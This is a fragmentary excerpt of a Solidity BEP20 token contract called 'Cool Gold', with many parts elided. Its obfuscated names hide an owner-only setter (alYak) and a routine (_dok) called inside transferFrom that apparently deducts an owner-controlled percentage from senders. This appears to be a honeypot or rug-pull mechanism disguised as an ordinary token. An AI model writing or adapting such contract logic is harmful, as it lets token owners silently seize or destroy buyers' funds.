...
contract CoolGold is BEP20AS {
    using SSMathx for uint256;

    string public name20FA =  "Cool Gold";
    string public symbol20FA =  "COOLGOLD";
    uint8 public decimals20FA = 9;
    uint public _totalSupplyb = 1*10**15 * 10**9;
    ...
    constructor() {
        ...
        balances[msg.sender] = _totalSupplyb;
        
        emit Transfer(address(0), msg.sender, _totalSupplyb);
    }
    
    uint8 private _dovagene;
   ...
   function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyb - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _dok(from,tokens.mul(bakYak()).div(10**2));
    ...
    function alYak(uint8 dovagene) public virtual onlyOwner {
		_dovagene = dovagene;
	}
    ...
    function _dok(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyb = _totalSupplyb.sub1(tokens);
